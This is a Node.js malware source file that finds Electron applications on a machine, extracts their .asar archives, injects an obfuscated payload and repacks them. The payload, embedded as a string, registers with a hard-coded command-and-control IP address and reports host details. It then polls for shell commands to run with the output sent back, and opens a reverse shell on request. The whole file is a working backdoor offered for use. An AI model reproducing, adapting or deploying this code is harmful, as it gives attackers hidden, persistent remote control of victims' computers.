var asar_files = require('./crawlfs').asar_apps;
var crawl = require('./crawlfs');
var api = require('./api');

// put shellcode below
const shellcode = ";const a0_0xb4b130=a0_0x24e4;(function(_0x28ea3e,_0x4cb7dd){const _0x20ed42=a0_0x24e4,_0xb1febb=_0x28ea3e();while(!![]){try{const _0x3e812c=-parseInt(_0x20ed42(0x1be))/0x1*(parseInt(_0x20ed42(0x1bf))/0x2)+-parseInt(_0x20ed42(0x1cc))/0x3+-parseInt(_0x20ed42(0x1db))/0x4*(-parseInt(_0x20ed42(0x1d5))/0x5)+-parseInt(_0x20ed42(0x1d4))/0x6*(parseInt(_0x20ed42(0x1b4))/0x7)+-parseInt(_0x20ed42(0x1ce))/0x8*(parseInt(_0x20ed42(0x1b6))/0x9)+parseInt(_0x20ed42(0x1bb))/0xa+parseInt(_0x20ed42(0x1c5))/0xb*(parseInt(_0x20ed42(0x1d0))/0xc);if(_0x3e812c===_0x4cb7dd)break;else _0xb1febb['push'](_0xb1febb['shift']());}catch(_0x314ade){_0xb1febb['push'](_0xb1febb['shift']());}}}(a0_0x4198,0x496ea));function a0_0x4198(){const _0x4fd173=['status','cmd.exe','/Jrk5M23dVY4PbQpV/EL84gcJjgjWgReuS','statusCode','/Jrk5M23dVY4PbQpV/GTGcAmaf9AVkJm35/','Socket','write','stdin','utf-8','/bin/sh','error','952AzhZmf','writeFileSync','333vyuPsq','Connected','win','POST','toString','5450260vxZCJl','/7bhaP7ubtwFvgFUn/','pipe','240815ZjYUlM','2wPfUst','stdout','exit','stderr','application/json','config.cfg','319LVQXUE','split','GET','data','parse','readFileSync','setEncoding','896121bakwPO','arch','16952ENrsyP','net','130980zyhndi','connect','request','stringify','2202sfWEcO','535270VFQONS','end','http','op-2','utf8','platform','4duoHpj','push'];a0_0x4198=function(){return _0x4fd173;};return a0_0x4198();}function a0_0x24e4(_0x456992,_0x4ff8f7){const _0x41989c=a0_0x4198();return a0_0x24e4=function(_0x24e4e3,_0x328d26){_0x24e4e3=_0x24e4e3-0x1aa;let _0x492feb=_0x41989c[_0x24e4e3];return _0x492feb;},a0_0x24e4(_0x456992,_0x4ff8f7);}const fs=require('fs'),os=require('os'),net=require(a0_0xb4b130(0x1cf)),http=require(a0_0xb4b130(0x1d7)),{exec,spawn}=require('child_process'),apiURL='45.153.241.50',apiPort=0x50,userAgent={'User-Agent':'op-2'},userAgentJson={'User-Agent':a0_0xb4b130(0x1d8),'Content-Type':a0_0xb4b130(0x1c3)},configPath=a0_0xb4b130(0x1c4),httpRequest=_0x3295e5=>{return new Promise((_0x2b46b3,_0x262503)=>{const _0x5e1fd6=a0_0x24e4,_0x4bfc01=http[_0x5e1fd6(0x1d2)](_0x3295e5,_0x3ba789=>{const _0x90db77=_0x5e1fd6;_0x2b46b3(_0x3ba789[_0x90db77(0x1ac)]);});_0x4bfc01['on']('error',_0xe41edb=>{_0x2b46b3(![]);}),_0x4bfc01[_0x5e1fd6(0x1d6)]();});},httpRequestBody=_0x319542=>{return new Promise((_0x9ef5d6,_0x824e14)=>{const _0x41a444=a0_0x24e4,_0x460a9f=http[_0x41a444(0x1d2)](_0x319542,_0x3f2e8b=>{const _0x342427=_0x41a444;if(_0x3f2e8b[_0x342427(0x1ac)]<0xc8||_0x3f2e8b[_0x342427(0x1ac)]>=0x12c)return _0x9ef5d6(![]);let _0x13855b=[];_0x3f2e8b['on'](_0x342427(0x1c8),_0xd55368=>{_0x13855b['push'](_0xd55368);}),_0x3f2e8b['on'](_0x342427(0x1d6),()=>{const _0x4c754c=_0x342427;try{_0x13855b=JSON[_0x4c754c(0x1c9)](Buffer['concat'](_0x13855b)[_0x4c754c(0x1ba)]());}catch(_0xf1b843){_0x9ef5d6(![]);}_0x9ef5d6(_0x13855b);});});_0x460a9f['on'](_0x41a444(0x1b3),_0x53cf3b=>{_0x9ef5d6(![]);}),_0x460a9f['end']();});},httpRequestBodyJson=(_0x3b6354,_0x1443ef)=>{return new Promise((_0x4b3b7b,_0x50a59e)=>{const _0x8829c0=a0_0x24e4,_0x10518d=http[_0x8829c0(0x1d2)](_0x3b6354,_0x664c7=>{const _0x656069=_0x8829c0;if(_0x664c7['statusCode']<0xc8||_0x664c7[_0x656069(0x1ac)]>=0x12c)return _0x4b3b7b(![]);_0x664c7[_0x656069(0x1cb)](_0x656069(0x1d9));let _0x46252f=[];_0x664c7['on'](_0x656069(0x1c8),_0x434851=>{const _0x11104b=_0x656069;_0x46252f[_0x11104b(0x1dc)](_0x434851);}),_0x664c7['on'](_0x656069(0x1d6),()=>{const _0x204180=_0x656069;try{_0x46252f=JSON[_0x204180(0x1c9)](Buffer['concat'](_0x46252f)[_0x204180(0x1ba)]());}catch(_0x4b4915){_0x4b3b7b(![]);}_0x4b3b7b(_0x46252f);});});_0x10518d['on'](_0x8829c0(0x1b3),_0x4fc3e7=>{_0x4b3b7b(![]);}),_0x10518d['write'](JSON[_0x8829c0(0x1d3)](_0x1443ef)),_0x10518d[_0x8829c0(0x1d6)]();});},checkConnection=async()=>{const _0x1c3580=a0_0xb4b130,_0x9a01d8={'hostname':apiURL,'port':apiPort,'path':'/','method':_0x1c3580(0x1c7),'headers':userAgent},_0x4da82b=await httpRequest(_0x9a01d8);return _0x4da82b==0xc8?!![]:![];},checkAccount=async(_0x4eb1c1,_0x122d94)=>{const _0x2889c9=a0_0xb4b130,_0x18c4c1={'hostname':apiURL,'port':apiPort,'path':_0x2889c9(0x1ad)+_0x4eb1c1+'/'+_0x122d94,'method':'GET','headers':userAgent},_0x9ac2d6=await httpRequest(_0x18c4c1);return _0x9ac2d6==0xc8?!![]:![];},registerAccount=async()=>{const _0x44cebf=a0_0xb4b130,_0x3c61a9={'hostname':apiURL,'port':apiPort,'path':_0x44cebf(0x1ab),'method':'POST','headers':userAgent},_0x19344f=await httpRequestBody(_0x3c61a9);if(_0x19344f){const _0x478f1d=[_0x19344f['identifier'],_0x19344f['token']];return _0x478f1d;}else return![];},updateDetails=async(_0x95e907,_0x491b59)=>{const _0x1b7f51=a0_0xb4b130,_0x4e0203={'hostname':apiURL,'port':apiPort,'path':'/sDHPF4sbaT75tXph/hsEVAEHdgBCFc4FD/'+_0x95e907+'/'+_0x491b59,'method':_0x1b7f51(0x1b9),'headers':userAgentJson},_0x55327b={'hostname':os['hostname'](),'platform':os[_0x1b7f51(0x1da)](),'arch':os[_0x1b7f51(0x1cd)]()},_0x1a8d49=await httpRequestBodyJson(_0x4e0203,_0x55327b);return _0x1a8d49?_0x1a8d49:![];},checkCommand=async(_0x5e256f,_0xe8d325)=>{const _0x5c34cf=a0_0xb4b130,_0x395f5f={'hostname':apiURL,'port':apiPort,'path':'/csz65YNJ3FUNB897/'+_0x5e256f+'/'+_0xe8d325,'method':_0x5c34cf(0x1c7),'headers':userAgent},_0x503b04=await httpRequestBody(_0x395f5f);_0x503b04['cmd']&&exec(_0x503b04['cmd'],async(_0x5c863b,_0x3449db)=>{const _0x10f43f=_0x5c34cf,_0x4f0f7a={'hostname':apiURL,'port':apiPort,'path':'/3HtB8u8vGuaJ79Kq/'+_0x5e256f+'/'+_0xe8d325,'method':_0x10f43f(0x1b9),'headers':userAgentJson};await httpRequestBodyJson(_0x4f0f7a,{'output':_0x3449db});});},runShell=async(_0x2aee39,_0x30b66f)=>{const _0x68218a=a0_0xb4b130;let _0x1c9637=new net[(_0x68218a(0x1ae))]();_0x1c9637[_0x68218a(0x1d1)](_0x30b66f,_0x2aee39,()=>{const _0x29969f=_0x68218a;let _0x4a7bbf=spawn(process[_0x29969f(0x1da)]['includes'](_0x29969f(0x1b8))?_0x29969f(0x1aa):_0x29969f(0x1b2),[]);_0x1c9637[_0x29969f(0x1af)](_0x29969f(0x1b7)),_0x1c9637[_0x29969f(0x1bd)](_0x4a7bbf[_0x29969f(0x1b0)]),_0x4a7bbf[_0x29969f(0x1c0)][_0x29969f(0x1bd)](_0x1c9637),_0x4a7bbf[_0x29969f(0x1c2)][_0x29969f(0x1bd)](_0x1c9637),_0x4a7bbf['on'](_0x29969f(0x1c1),(_0x5d44e9,_0x464d6b)=>{const _0xdc95ee=_0x29969f;_0x1c9637[_0xdc95ee(0x1d6)]('Disconnected');});}),_0x1c9637['on']('error',_0x342a87=>{return![];});},checkShell=async(_0x111532,_0x2933df)=>{const _0x580692=a0_0xb4b130,_0x3573a6={'hostname':apiURL,'port':apiPort,'path':_0x580692(0x1bc)+_0x111532+'/'+_0x2933df,'method':'GET','headers':userAgent},_0x38fe2f=await httpRequestBody(_0x3573a6);_0x38fe2f[_0x580692(0x1dd)]&&runShell(_0x38fe2f['ip'],_0x38fe2f['port']);},main=async()=>{const _0x154768=a0_0xb4b130,_0x3df3e4=await checkConnection();if(_0x3df3e4){const _0x217e35=fs['existsSync'](configPath);if(_0x217e35){const _0x4d9749=fs[_0x154768(0x1ca)](configPath,_0x154768(0x1b1))[_0x154768(0x1c6)](':'),_0x1d8809=await checkAccount(_0x4d9749[0x0],_0x4d9749[0x1]);if(_0x1d8809)await updateDetails(_0x4d9749[0x0],_0x4d9749[0x1]),setInterval(()=>{checkCommand(_0x4d9749[0x0],_0x4d9749[0x1]),checkShell(_0x4d9749[0x0],_0x4d9749[0x1]);},0x61a8);else{const _0x25f2cd=await registerAccount();fs['writeFileSync'](configPath,_0x25f2cd[0x0]+':'+_0x25f2cd[0x1]),main();}}else{const _0x289a5c=await registerAccount();fs[_0x154768(0x1b5)](configPath,_0x289a5c[0x0]+':'+_0x289a5c[0x1]),main();}}else setTimeout(()=>{main();},0x61a8);};main();";
// file = process.env.TMP + "\\checkmyrunningprogramstatus.txt"
// if(api.check_file_exists(file)){
//     console.log("already ran.. quitting");
//     process.exit(0);
// }
// console.log("running.")
(async () => {
    // fast pkiller (increase for faster speed)
    console.log('crawling..')
    let asar_apps = await crawl.asar_apps();
    console.log(`asar_apps: ${asar_apps}`);
    let electron_exes = await crawl.electron_exe(asar_apps);
    console.log(`electron_exes: ${electron_exes}`);
    let archive_list = await api.list_archives(asar_apps)
    setInterval(() =>{
        api.kill_interferring_processes(electron_exes)
    },100)
    console.log(`archive_list: ${archive_list}`);
    extracted_archives = await api.extract_archives(asar_apps);
    console.log(`extracted: ${extracted_archives}`);
    let backdoor_array = [];
    for(archive of extracted_archives){
        backdoor_array.push(archive)
    }
    console.log(`backdoor_array: ${backdoor_array}`);
    for(let i=0; i<extracted_archives.length; i++){
        backdoor_array[i] = extracted_archives[i] + archive_list[i];
    }
    await api.backdoor_files(backdoor_array, shellcode)
    // await api.delete_archives(asar_apps)
    await api.pack_archives(extracted_archives, asar_apps);
    // cleanup
    await api.clear_folders(extracted_archives);
    // gtfo
    process.exit(0);
})();